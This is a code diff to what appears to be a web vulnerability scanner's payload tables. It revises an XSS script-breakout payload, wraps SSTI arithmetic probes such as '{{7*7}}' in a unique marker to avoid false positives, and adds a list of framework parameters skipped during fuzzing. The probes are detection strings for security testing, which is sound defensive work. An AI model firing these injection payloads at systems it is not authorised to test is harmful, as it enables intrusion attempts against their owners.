@@ -168,9 +168,9 @@ XSS_PAYLOADS = [
      "technique": "attribute-context", "payload": f'"><svg onload={XSS_PROOF}>',
      "proof": f'"><svg onload={XSS_PROOF}>', "detect": "reflect",
      "owasp": "A05:2025", "mitre": "T1059"},
-    {"id": "XSS-J1", "name": "Reflected XSS (JS string breakout)", "family": "xss",
-     "technique": "js-context", "payload": f"';{XSS_PROOF}//", "proof": f"';{XSS_PROOF}//",
-     "detect": "reflect", "owasp": "A05:2025", "mitre": "T1059"},
+    {"id": "XSS-J1", "name": "Reflected XSS (script-context breakout)", "family": "xss",
+     "technique": "js-context", "payload": f"</script><x>{XSS_PROOF}</x>",
+     "proof": f"<x>{XSS_PROOF}</x>", "detect": "reflect", "owasp": "A05:2025", "mitre": "T1059"},
 ]
 
 TRAVERSAL_PAYLOADS = [
@@ -204,20 +204,31 @@ CMDI_PAYLOADS = [
 ]
 
 SSTI_PAYLOADS = [
-    # 7*7=49 confirms evaluation; the literal "{{7*7}}" must NOT appear instead.
+    # The arithmetic is wrapped in a unique marker (arg…us) so the evaluated
+    # result "arg49us" cannot collide with a stray "49" elsewhere on the page
+    # (e.g. inside a base64 VIEWSTATE blob). Evaluation is confirmed only when
+    # the wrapped *result* appears AND the literal payload does not.
     {"id": "SSTI-1", "name": "SSTI (Jinja/Twig {{7*7}})", "family": "ssti",
-     "technique": "expression", "payload": "{{7*7}}", "literal": "{{7*7}}",
-     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
+     "technique": "expression", "payload": "arg{{7*7}}us", "literal": "arg{{7*7}}us",
+     "expect": "arg49us", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
     {"id": "SSTI-2", "name": "SSTI (${7*7})", "family": "ssti",
-     "technique": "expression", "payload": "${7*7}", "literal": "${7*7}",
-     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
+     "technique": "expression", "payload": "arg${7*7}us", "literal": "arg${7*7}us",
+     "expect": "arg49us", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
     {"id": "SSTI-3", "name": "SSTI (Razor/ERB <%=7*7%>)", "family": "ssti",
-     "technique": "expression", "payload": "<%= 7*7 %>", "literal": "<%= 7*7 %>",
-     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
+     "technique": "expression", "payload": "arg<%=7*7%>us", "literal": "arg<%=7*7%>us",
+     "expect": "arg49us", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
     {"id": "SSTI-4", "name": "SSTI (#{7*7})", "family": "ssti",
-     "technique": "expression", "payload": "#{7*7}", "literal": "#{7*7}",
-     "expect": "49", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
+     "technique": "expression", "payload": "arg#{7*7}us", "literal": "arg#{7*7}us",
+     "expect": "arg49us", "detect": "ssti_eval", "owasp": "A05:2025", "mitre": "T1221"},
 ]
+
+# Framework-generated / non-user params that produce noisy false positives when
+# fuzzed (reflected verbatim into hidden fields). Skipped during injection.
+SKIP_FUZZ_PARAMS = {
+    "__viewstate", "__viewstategenerator", "__eventvalidation", "__eventtarget",
+    "__eventargument", "__requestverificationtoken", "__viewstateencrypted",
+    "csrf_token", "xsrf_token", "authenticity_token", "_csrf", "_token", "nonce",
+}
 
 SSRF_PAYLOADS = [
     {"id": "SSRF-1", "name": "SSRF (loopback)", "family": "ssrf",
